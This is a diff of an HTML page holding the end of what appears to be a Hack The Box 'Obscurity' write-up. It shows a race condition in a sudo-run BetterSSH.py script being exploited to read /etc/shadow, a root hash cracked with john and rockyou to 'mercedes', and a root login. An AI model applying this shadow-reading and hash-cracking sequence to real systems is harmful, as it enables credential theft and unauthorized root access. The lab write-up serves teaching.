     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User robert may run the following commands on obscure:
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>User robert may run the following commands on obscure:
     (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
-</code></pre><p>By analyzing the source code, we see that once you try to login with <code>BetterSSH</code>, there is a moment where <code>/etc/shadow</code> is open in read mode (posible due to execute <code>BetterSSH.py</code> with sudo!), and is written under <code>/tmp/SSH</code> on a file, later on the temporal <code>/etc/shadow</code> written in tmp will be deleted, this means here we have a race condition where at some moment if we try to read the contents of the temporal file generated we will be able to do it, said this, let&rsquo;s try it.</p>
+</code></pre></div><p>By analyzing the source code, we see that once you try to login with <code>BetterSSH</code>, there is a moment where <code>/etc/shadow</code> is open in read mode (posible due to execute <code>BetterSSH.py</code> with sudo!), and is written under <code>/tmp/SSH</code> on a file, later on the temporal <code>/etc/shadow</code> written in tmp will be deleted, this means here we have a race condition where at some moment if we try to read the contents of the temporal file generated we will be able to do it, said this, let&rsquo;s try it.</p>
 <p>On one terminal, we execute <code>BetterSSH.py</code> with sudo:</p>
-<pre tabindex=0><code class=language-console data-lang=console>robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
 Enter username: root
 Enter password: foo
 Incorrect pass
-</code></pre><p>And in another term, we execute a while true loop, that will be doing cat on the files under <code>/tmp/SSH</code>, and at some moment we confim the race condition we previously thought of as we have the content of <code>/etc/shadow</code> for the user root (remember the script is run with sudo):</p>
-<pre tabindex=0><code class=language-console data-lang=console>robert@obscure:/tmp/SSH$ while true; do cat *; done
+</code></pre></div><p>And in another term, we execute a while true loop, that will be doing cat on the files under <code>/tmp/SSH</code>, and at some moment we confim the race condition we previously thought of as we have the content of <code>/etc/shadow</code> for the user root (remember the script is run with sudo):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>robert@obscure:/tmp/SSH$ while true; do cat *; done
 root
 $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
 18226
 0
 99999
 7
-</code></pre><p>I grab that content of shadow and the one of <code>/etc/passwd</code>, run unshadow to generate a file compatible to john and crack it:</p>
-<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# unshadow passwd.txt shadow.txt &gt; rootkey.txt
+</code></pre></div><p>I grab that content of shadow and the one of <code>/etc/passwd</code>, run unshadow to generate a file compatible to john and crack it:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# unshadow passwd.txt shadow.txt &gt; rootkey.txt
 root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# john --wordlist=/usr/share/wordlists/rockyou.txt rootkey.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
@@ -707,12 +707,12 @@ Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
 mercedes         (root)
 --- SNIP ---
 Session completed
-</code></pre><p>And there we have the password of root user; <code>mercedes</code> and we succesfully login as root with it :D</p>
-<pre tabindex=0><code class=language-console data-lang=console>robert@obscure:~/BetterSSH$ su - root
+</code></pre></div><p>And there we have the password of root user; <code>mercedes</code> and we succesfully login as root with it :D</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>robert@obscure:~/BetterSSH$ su - root
 Password:
 root@obscure:~# id
 uid=0(root) gid=0(root) groups=0(root)
-</code></pre><p>Well, this was a really fun machine, and one that teach me a lot (specifically talking python stuff), so well I hope I can give something yousefull to you with this write up, and thanks a lot for read until the end :)</p>
+</code></pre></div><p>Well, this was a really fun machine, and one that teach me a lot (specifically talking python stuff), so well I hope I can give something yousefull to you with this write up, and thanks a lot for read until the end :)</p>
 <p>I will try to be making some time to do write ups of some other machines, until next time!!</p>
 </div>
 <div class=pagination>
